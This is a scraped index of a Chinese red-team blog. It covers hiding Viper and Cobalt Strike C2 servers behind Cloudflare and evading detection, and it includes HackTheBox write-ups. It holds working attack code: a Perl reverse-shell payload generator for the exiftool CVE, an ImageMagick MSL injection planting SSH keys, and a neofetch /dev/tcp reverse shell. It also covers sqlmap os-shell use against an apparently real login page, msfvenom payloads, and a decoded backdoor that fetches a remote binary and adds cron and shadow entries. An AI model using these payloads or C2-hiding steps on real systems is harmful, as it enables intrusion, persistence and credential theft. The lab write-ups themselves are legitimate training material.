http://127.0.0.1:60000 - hostname: test.example.com service: http://127.0.0.1:6000 - service: http_status:404 然后systemctl restart cloudflared重启cloudflared,在cloudflare dashboard中找到当前cloudflared使用的域名并添加test的CNAME条目,CNAME的指向与viper.example.com一致 首先创建指向test.example.com:80的虚拟监听 然后创建指向127.0.0.1:6000的真实监听,注意LURI参数与虚拟监听一致 生成载荷是选择虚拟监听进行生成,最终成果如下 不知道是我本地网络的问题还是viper的问题,用http上线本地虚拟机中的windows后,一段时间不操作会出现掉线现象… ","date":"2022-07-19","objectID":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/:3:0","tags":null,"title":"Viper","uri":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"https上线 假设msf监听6001端口,修改/etc/cloudflared/config.yml为 tunnel: tunnelid credentials-file: /root/.cloudflared/tunnelid.json ingress: - hostname: viper.example.com service: http://127.0.0.1:60000 - hostname: test.example.com service: http://127.0.0.1:6000 - hostname: test1.example.com service: https://127.0.0.1:6001 originRequest: connectTimeout: 10s noTLSVerify: true - service: http_status:404 注意service处要填写https而不是http 然后systemctl restart cloudflared重启cloudflared,在cloudflare dashboard中找到当前cloudflared使用的域名并添加test1的CNAME条目,CNAME的指向与viper.example.com一致 windows/x64/meterpreter/reverse_https 首先创建指向test1.example.com:443的虚拟监听,SSL证书为空 然后创建指向127.0.0.1:6001的真实监听,注意LURI参数与虚拟监听一致,SSL证书为空 生成载荷是选择虚拟监听进行生成,最终成果如下 linux/x64/meterpreter_reverse_https 使用linux/x64/meterpreter_reverse_https时会出现问题,由于cloudflared tunnel存在tls版本限制,最低版本为TLSv1.2且无法修改,但是使用载荷linux/x64/meterpreter_reverse_https直接生成的ELF在链接时采用的是TLSv1,因此无法链接 监听创建方法同上,但是ELF在链接时出现以下问题 直接curl 限制curl的tls版本 解决方法:暂无 我使用msfvenom -p linux/x64/meterpreter_reverse_https lhost=test1.example.com lport=443 -f elf -o https.elf手动生成一个elf再次进行测试 发现其同样使用TLSv1进行链接,推测问题出现在msf身上,可能的关联issue如下 reverse_https does not work: Handshake failed #14960 SSL Handler Not Supporting Older SSL/TLS Versions #15435 Need Http / Https Meterpreter TLS/Cert Update #10903 ","date":"2022-07-19","objectID":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/:4:0","tags":null,"title":"Viper","uri":"/viper%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"基础配置 保姆级Cobalt Strike主机隐藏教程 在vultr上安装openjdk-11-jre和screen并将teamserver上传 修改默认端口,并控制可访问ip 我这里用zerotier组了一个局域网,将teaserver的端口仅对局域网开放 2022年7月更新 用nkn隧道替代zerotier,降低系统资源占用 添加cdn 去freenom或者是nic.eu.org整个免费域名 然后用cloudflare接管域名并添加dns解析,开启cdn 生成并替换证书 openssl pkcs12 -export -in example.com.pem -inkey example.com.key -out cdn.example.com.p12 -name cdn.example.com -passout pass:password keytool -importkeystore -deststorepass password -destkeypass password -destkeystore cdn.example.com.store -srckeystore cdn.example.com.p12 -srcstoretype PKCS12 -srcstorepass password -alias cdn.example.com cloudflare.profile该profile来自参考文章,实际使用时需要进行完善 https-certificate { set keystore \"cdn.example.com.store\"; set password \"password\"; } http-stager { set uri_x86 \"/api/1\"; set uri_x64 \"/api/2\"; client { header \"Host\" \"cdn.example.com\"; } server { output{ print; } } } http-get { set uri \"/api/3\"; client { header \"Host\" \"cdn.example.com\"; metadata { base64; header \"Cookie\"; } } server { output{ print; } } } http-post { set uri \"/api/4\"; client { header \"Host\" \"cdn.example.com\"; id { uri-append; } output{ print; } } server { output{ print; } } } 用screen把teamserver挂在后台 连接teamserver 添加监听器 ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:1:0","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"CS上线 发现一个网站存在sql注入 POST /xxxxx/login.aspx HTTP/1.1 Host: ip User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 183 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: application/x-www-form-urlencoded Cookie: ASP.NET_SessionId=xxx Origin: https://ip Range: bytes=0-10240 Referer: https://ip/xxxxx/default.aspx Upgrade-Insecure-Requests: 1 login_button=Login\u0026txtPass=password\u0026txtUser=username sqlmap得到os-shell sqlmap -r request.txt -p \"txtUser\" --random-agent --risk 3 --level 3 --technique ES --random-agent --os-shell 生成payload 将payload复制到os-shell中并执行,等待CS上线 当前用户为nt authority\\network service需要进行提权操作 ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:2:0","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"联动MSF ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:3:0","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"MSF设置 配置ngrok,将MSF监听端口映射到公网 ngrok tcp 5000即可 MSF监听设置 注意这里要选择reverse_http而不是reverse_tcp msf6 \u003e use exploit/multi/handler msf6 exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_http msf6 exploit(multi/handler) \u003e set lhost 127.0.0.1 msf6 exploit(multi/handler) \u003e set lport 5000 msf6 exploit(multi/handler) \u003e run ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:3:1","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"CS设置 设置新的监听器 新建会话 选择msf的监听器 等待msf接收即可 ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:3:2","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["红队/提权/域渗透"],"content":"MSF提权 非常幸运,用getsystem自动提权就将权限提升到nt authority\\system 之前用CS读取systeminfo并分析的时候,发现可以用CVE-2020-0787进行提权 https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION这个exp需要进行一定的修改 添加用户 shodan已经提示该ip已经开启了3389端口,同时也使用nmap进行确认 利用Parallels Client进行连接 这个软件有个好处,可以通过代理连接rdp 2022年7月更新 Cobalt Strike原版的特征没有去除,解决方法 去除特征 stager URL生成机制 CS4.4绕过vultr特征检测修改checksum8算法 利用ufw限制可访问端口的ip(治标不治本) 因为cs是通过cdn上线的,因此只允许cdn的ip访问443端口是一种临时解决方案,归根结底还是需要对checksum8算法进行修改 #!/bin/bash ipv4s=`curl -s https://www.cloudflare.com/ips-v4` ipv6s=`curl -s https://www.cloudflare.com/ips-v6` for ip in $ipv4s$IFS$ipv6s do ufw allow from $ip to any port 443; done ","date":"2022-04-04","objectID":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/:3:3","tags":null,"title":"Cobalt Strike","uri":"/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/421 ","date":"2022-03-30","objectID":"/htb-timing/:0:0","tags":null,"title":"HackTheBox-Timing","uri":"/htb-timing/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 一个登录框,测试了一下貌似不存在sql注入 目录爆破结果 存在images/upload目录,但是没有爆破出有价值的文件 ","date":"2022-03-30","objectID":"/htb-timing/:1:0","tags":null,"title":"HackTheBox-Timing","uri":"/htb-timing/"},{"categories":["HackTheBox"],"content":"文件包含读取源代码 注意到image.php没有直接跳转到login.php,推测该文件可能可以接受参数去读取images文件夹中的文件 wfuzz -c -w ~/SecTools/SecLists-2021.4/Discovery/Web-Content/burp-parameter-names.txt -u \"http://10.10.11.135/image.php?FUZZ=/etc/passwd\" 传入img=index.php时,跳转到login.php,推测这里为文件包含 php://filter/read=convert.base64-encode/resource=xxx /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog❌102:106::/home/syslog:/usr/sbin/nologin messagebus❌103:107::/nonexistent:/usr/sbin/nologin _apt❌104:65534::/nonexistent:/usr/sbin/nologin lxd❌105:65534::/var/lib/lxd/:/bin/false uuidd❌106:110::/run/uuidd:/usr/sbin/nologin dnsmasq❌107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape❌108:112::/var/lib/landscape:/usr/sbin/nologin pollinate❌109:1::/var/cache/pollinate:/bin/false sshd❌110:65534::/run/sshd:/usr/sbin/nologin mysql❌111:114:MySQL Server,,,:/nonexistent:/bin/false aaron❌1000:1000:aaron:/home/aaron:/bin/bash image.php \u003c?php function is_safe_include($text) { $blacklist = array(\"php://input\", \"phar://\", \"zip://\", \"ftp://\", \"file://\", \"http://\", \"data://\", \"expect://\", \"https://\", \"../\"); foreach ($blacklist as $item) { if (strpos($text, $item) !== false) { return false; } } return substr($text, 0, 1) !== \"/\"; } if (isset($_GET['img'])) { if (is_safe_include($_GET['img'])) { include($_GET['img']); } else { echo \"Hacking attempt detected!\"; } } login.php \u003c?php include \"header.php\"; function createTimeChannel() { sleep(1); } include \"db_conn.php\"; if (isset($_SESSION['userid'])){ header('Location: ./index.php'); die(); } if (isset($_GET['login'])) { $username = $_POST['user']; $password = $_POST['password']; $statement = $pdo-\u003eprepare(\"SELECT * FROM users WHERE username = :username\"); $result = $statement-\u003eexecute(array('username' =\u003e $username)); $user = $statement-\u003efetch(); if ($user !== false) { createTimeChannel(); if (password_verify($password, $user['password'])) { $_SESSION['userid'] = $user['id']; $_SESSION['role'] = $user['role']; header('Location: ./index.php'); return; } } $errorMessage = \"Invalid username or password entered\"; } ?\u003e ... 注意这里有一个createTimeChannel,当用户名正确时后不会直接回显,而是延迟回显类似于延时注入 db_conn.php \u003c?php $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd'); 传入user=admin\u0026password=4_V3Ry_l0000n9_p422w0rd,成功延迟了一秒钟,但是没有进行跳转,说明存在用户admin,但是密码没整出来 在/etc/passwd中存在aaron用户,尝试登录,也成功延迟了一秒钟,说明存在该用户 测试得知aaron作为密码可以登录aaron用户 profile_update.php \u003c?php include \"auth_check.php\"; $error = \"\"; if (empty($_POST['firstName'])) { $error = 'First Name is required.'; } else if (empty($_POST['lastName'])) { $error = 'Last Name is required.'; } else if (empty($_POST['email'])) { $error = 'Email is required.'; } else if (empty($_POST['company'])) { $error = 'Company is required.'; } if (!empty($error)) { die(\"Error updating profile, reason: \" . $error); } else { include \"db_conn.php\"; $id = $_SESSION['userid']; $statement = $pdo-\u003eprepare(\"SELECT * FROM users WHERE id = :id\"); $result = $statement-\u003eexecute(array('id' =\u003e $id)); $user = $statement-\u003efetch(); if ($user !== false) { ini_set('displa","date":"2022-03-30","objectID":"/htb-timing/:2:0","tags":null,"title":"HackTheBox-Timing","uri":"/htb-timing/"},{"categories":["HackTheBox"],"content":"获取user权限 upload.php \u003c?php include(\"admin_auth_check.php\"); $upload_dir = \"images/uploads/\"; if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true); } $file_hash = uniqid(); $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]); $target_file = $upload_dir . $file_name; $error = \"\"; $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION)); if (isset($_POST[\"submit\"])) { $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) { $error = \"Invalid file\"; } } // Check if file already exists if (file_exists($target_file)) { $error = \"Sorry, file already exists.\"; } if ($imageFileType != \"jpg\") { $error = \"This extension is not allowed.\"; } if (empty($error)) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) { echo \"The file has been uploaded.\"; } else { echo \"Error: There was an error uploading your file.\"; } } else { echo \"Error: \" . $error; } ?\u003e 注意到文件名是md5('$file_hash' . time())而不是md5(\"$file_hash\" . time()),因此只需要知道时间戳即可 成功得到图片为238f241b8f6fe89215ecc1eb02b929db_info.jpg,利用文件包含即可getshell 无法直接反弹shell,因此使用正向绑定 linpeas.sh显示-rw-r--r-- 1 root root 627851 Jul 20 2021 /opt/source-files-backup.zip 压缩包中存在.git文件夹 用S3cr3t_unGu3ss4bl3_p422w0Rd尝试登录ssh ","date":"2022-03-30","objectID":"/htb-timing/:3:0","tags":null,"title":"HackTheBox-Timing","uri":"/htb-timing/"},{"categories":["HackTheBox"],"content":"获取root权限 https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md aaron@timing:/usr/bin$ cat netutils #! /bin/bash java -jar /root/netutils.jar aaron@timing:~$ sudo netutils netutils v0.1 Select one option: [0] FTP [1] HTTP [2] Quit Input \u003e\u003e aaron@timing:~$ nc -lvnp 8000 Listening on [0.0.0.0] (family 0, port 8000) Connection from 127.0.0.1 53856 received! GET / HTTP/1.0 Host: 127.0.0.1:8000 Accept: */* Range: bytes=1- User-Agent: Axel/2.16.1 (Linux) https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L69 default_filename = default http://manpages.ubuntu.com/manpages/trusty/zh_CN/man1/axel.1.html /etc/axelrc 系统全局配置文件 ~/.axelrc 个人配置文件 这些文件正文不会在一个手册页内显示，但我希望跟程序一起安装的样本文件包含足够的信息。 配置文件在不同系统的位置可能不一样。 修改配置文件default_filename = /root/.ssh/authorized_keys 同时把本机的ssh公钥传到靶机上并命名为index.html,python3建立一个服务器,将公钥通过netutils下载并保存到/root/.ssh/authorized_keys中 ","date":"2022-03-30","objectID":"/htb-timing/:4:0","tags":null,"title":"HackTheBox-Timing","uri":"/htb-timing/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/429 ","date":"2022-03-28","objectID":"/htb-meta/:0:0","tags":null,"title":"HackTheBox-Meta","uri":"/htb-meta/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 将10.10.11.140 artcorp.htb添加到/etc/hosts中 $ ./gobuster vhost -u http://artcorp.htb/ -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://artcorp.htb/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /mnt/hgfs/Exploits/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/03/27 23:53:31 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev01.artcorp.htb (Status: 200) [Size: 247] =============================================================== 2022/03/27 23:55:04 Finished =============================================================== 将10.10.11.140 dev01.artcorp.htb添加到/etc/hosts中 ","date":"2022-03-28","objectID":"/htb-meta/:1:0","tags":null,"title":"HackTheBox-Meta","uri":"/htb-meta/"},{"categories":["HackTheBox"],"content":"利用exiftool获取user权限 有个文件上传点http://dev01.artcorp.htb/metaview/index.php 上传png文件后,返回文件的ext信息 File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 254 Image Height : 255 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 8 Software : gnome-screenshot 推测这里可能存在imagemagick的漏洞ImageMagick 命令执行分析 但是试了一下貌似不对… 在生成imagemagick的利用payload时,发现exiftool的输出结果与网页回显的结果类似,推测其为exiftool CVE-2021-22204-exiftool convisolabs/CVE-2021-22204-exiftool #!/bin/env python3 import base64 import subprocess ip = '10.10.16.22' port = '9090' payload = b\"(metadata \\\"\\c${use MIME::Base64;eval(decode_base64('\" payload = payload + base64.b64encode( f\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'\u003e\u0026S');open(STDOUT,'\u003e\u0026S');open(STDERR,'\u003e\u0026S');exec('/bin/sh -i');}};\".encode() ) payload = payload + b\"'))};\\\")\" payload_file = open('payload', 'w') payload_file.write(payload.decode('utf-8')) payload_file.close() subprocess.run(['bzz', 'payload', 'payload.bzz']) subprocess.run(['djvumake', 'exploit.djvu', \"INFO=1,1\", 'BGjp=/dev/null', 'ANTz=payload.bzz']) subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif\u003c=exploit.djvu', 'image.jpg']) www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /etc/passwd | grep sh cat /etc/passwd | grep sh root❌0:0:root:/root:/bin/bash sshd❌105:65534::/run/sshd:/usr/sbin/nologin thomas❌1000:1000:thomas,,,:/home/thomas:/bin/bash linpeas.sh没有得到当前权限下的有效信息,传个pspy64监控下进程 2022/03/27 12:53:06 CMD: UID=0 PID=1 | /sbin/init 2022/03/27 12:54:01 CMD: UID=0 PID=17947 | /usr/sbin/CRON -f 2022/03/27 12:54:01 CMD: UID=0 PID=17946 | /usr/sbin/cron -f 2022/03/27 12:54:01 CMD: UID=0 PID=17945 | /usr/sbin/CRON -f 2022/03/27 12:54:01 CMD: UID=0 PID=17944 | /usr/sbin/CRON -f 2022/03/27 12:54:01 CMD: UID=0 PID=17943 | /usr/sbin/cron -f 2022/03/27 12:54:01 CMD: UID=0 PID=17949 | /usr/sbin/CRON -f 2022/03/27 12:54:01 CMD: UID=0 PID=17948 | /usr/sbin/CRON -f 2022/03/27 12:54:01 CMD: UID=1000 PID=17952 | /usr/local/bin/mogrify -format png *.* 2022/03/27 12:54:01 CMD: UID=1000 PID=17951 | /bin/bash /usr/local/bin/convert_images.sh 2022/03/27 12:54:01 CMD: UID=1000 PID=17950 | /bin/sh -c /usr/local/bin/convert_images.sh 2022/03/27 12:54:01 CMD: UID=0 PID=17957 | rm /tmp/systemd-private-44572498d12c46d58d79d44419a7b8db-apache2.service-288m5B /tmp/systemd-private-44572498d12c46d58d79d44419a7b8db-systemd-timesyncd.service-uK7uJf /tmp/vmware-root_473-2092907038 2022/03/27 12:54:01 CMD: UID=0 PID=17956 | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 2022/03/27 12:54:01 CMD: UID=0 PID=17955 | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 2022/03/27 12:54:01 CMD: UID=0 PID=17954 | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 2022/03/27 12:54:01 CMD: UID=0 PID=17953 | /bin/sh -c rm /tmp/* 2022/03/27 12:54:01 CMD: UID=0 PID=17959 | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 2022/03/27 12:54:01 CMD: UID=1000 PID=17958 | pkill mogrify /usr/local/bin/convert_images.sh #!/bin/bash cd /var/www/dev01.artcorp.htb/convert_images/ \u0026\u0026 /usr/local/bin/mogrify -format png *.* 2\u003e/dev/null pkill mogrify https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html \u003cimage authenticate='ff\" `echo $(id)\u003e /dev/shm/out`;\"'\u003e \u003cread filename=\"pdf:/etc/passwd\"/\u003e \u003cget width=\"base-width\" height=\"base-height\" /\u003e \u003cresize geometry=\"400x400\" /\u003e \u003cwrite filename=\"test.png\" /\u003e \u003csvg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u003e \u003cimage xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/\u003e \u003c/svg\u003e \u003c/image\u003e cp poc.svg /var/www/dev01.artcorp.htb/convert_images/即可 \u003cimage authenticate='ff\" `mkdir -p /home/thomas/.ssh;echo ssh-rsa AAAABxxx97s= kali@kali \u003e /home/thomas/.ssh/authorized_keys;echo $(whoami)\u003e /dev/shm/out`;\"'\u003e \u003cread filename=\"pdf:/etc/passwd\"/\u003e \u003cget ","date":"2022-03-28","objectID":"/htb-meta/:2:0","tags":null,"title":"HackTheBox-Meta","uri":"/htb-meta/"},{"categories":["HackTheBox"],"content":"获取root权限 [+] [CVE-2019-13272] PTRACE_TRACEME Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903 Exposure: highly probable Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*} Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c Comments: Requires an active PolKit agent. thomas@meta:~$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\\"\\\" https://gtfobins.github.io/gtfobins/neofetch/ 但不能直接利用 https://github.com/dylanaraps/neofetch/wiki/Customizing-Info 修改.config/neofetch/config.conf prin \"$(id)\"然后export XDG_CONFIG_HOME=/home/thomas/.config/ prin \"$(sh -i \u003e\u0026 /dev/tcp/10.10.16.22/9001 0\u003e\u00261)\" ","date":"2022-03-28","objectID":"/htb-meta/:3:0","tags":null,"title":"HackTheBox-Meta","uri":"/htb-meta/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/444 ","date":"2022-03-27","objectID":"/htb-routerspace/:0:0","tags":null,"title":"HackTheBox-RouteSpace","uri":"/htb-routerspace/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 ","date":"2022-03-27","objectID":"/htb-routerspace/:1:0","tags":null,"title":"HackTheBox-RouteSpace","uri":"/htb-routerspace/"},{"categories":["HackTheBox"],"content":"分析apk 可以下载一个RouterSpace.apk 配置anbox代理 burpsuite的监听设置为监听全部端口 adb shell settings put global http_proxy 192.168.250.1:8080 将10.10.11.148 routerspace.htb添加到/etc/hosts中 存在命令注入 ","date":"2022-03-27","objectID":"/htb-routerspace/:2:0","tags":null,"title":"HackTheBox-RouteSpace","uri":"/htb-routerspace/"},{"categories":["HackTheBox"],"content":"获取user权限 echo 'ssh-rsa AAAxxxWpa2NE297s= kali@kali' \u003e /home/paul/.ssh/authorized_keys ","date":"2022-03-27","objectID":"/htb-routerspace/:3:0","tags":null,"title":"HackTheBox-RouteSpace","uri":"/htb-routerspace/"},{"categories":["HackTheBox"],"content":"获取root权限 [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: probable Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2017-5618] setuid screen v4.5.0 LPE Details: https://seclists.org/oss-sec/2017/q1/184 Exposure: less probable Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154 CVE-2021-4034不行,CVE-2021-3156可以 ","date":"2022-03-27","objectID":"/htb-routerspace/:4:0","tags":null,"title":"HackTheBox-RouteSpace","uri":"/htb-routerspace/"},{"categories":["HackTheBox"],"content":"https://app.hackthebox.com/machines/439 ","date":"2022-03-27","objectID":"/htb-undetected/:0:0","tags":null,"title":"HackTheBox-Undetected","uri":"/htb-undetected/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 把10.10.11.146 store.djewelry.htb加到/etc/hosts里面 ","date":"2022-03-27","objectID":"/htb-undetected/:1:0","tags":null,"title":"HackTheBox-Undetected","uri":"/htb-undetected/"},{"categories":["HackTheBox"],"content":"获取user权限 xray直接扫出来了… \u003c?php system(\"find /var/www -name '*' | xargs grep -i password\");?\u003e 没有得到有效信息,当前用户为www-data \u003c?php system(\"cat /etc/passwd | grep sh\");?\u003e root❌0:0:root:/root:/bin/bash steven❌1000:1000:Steven Wright:/home/steven:/bin/bash sshd❌112:65534::/run/sshd:/usr/sbin/nologin steven1❌1000:1000:,,,:/home/steven:/bin/bash /etc/passwd显示存在steven用户,但没有权限进入/home/steven因此需要先提权到steven或者是steven1 Linux权限提升：自动化信息收集 利用linPEAS进行信息搜集,但信息量太大,无从下手 去瞄了眼wphackthebox-undetected-writeup,别人是在路径爆破的时候得到了一个叫info的ELF(我跳步了…) 具体路径位于/var/backups/info main-\u003echeck_root-\u003echeck_shell-\u003eexec_shell int exec_shell() { char *v0; // rax char *v1; // rax char *v2; // rax char *argv[4]; // [rsp+0h] [rbp-A90h] BYREF char v5[1328]; // [rsp+20h] [rbp-A70h] BYREF char v6[1320]; // [rsp+550h] [rbp-540h] BYREF char *path; // [rsp+A78h] [rbp-18h] char *v8; // [rsp+A80h] [rbp-10h] char *v9; // [rsp+A88h] [rbp-8h] path = \"/bin/bash\"; strcpy( v6, \"776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65\" \"645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420\" \"373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e\" \"3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030\" \"207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866\" \"316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30\" \"522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f\" \"7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d\" \"28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768\" \"696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a24\" \"67726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572\" \"732e7478743b20726d2075736572732e7478743b\"); v9 = v6; v8 = v5; while ( *v9 ) { v0 = v9++; v6[1319] = hexdigit2int((unsigned __int8)*v0); v1 = v9++; v6[1318] = hexdigit2int((unsigned __int8)*v1); v2 = v8++; *v2 = v6[1318] | (16 * v6[1319]); } *v8 = 0; argv[0] = path; argv[1] = \"-c\"; argv[2] = v5; argv[3] = 0LL; return execve(path, argv, 0LL); } 将那串16进制转换为ascii得到 wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" \u003e\u003e /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u003e= 1000 {system(\"echo 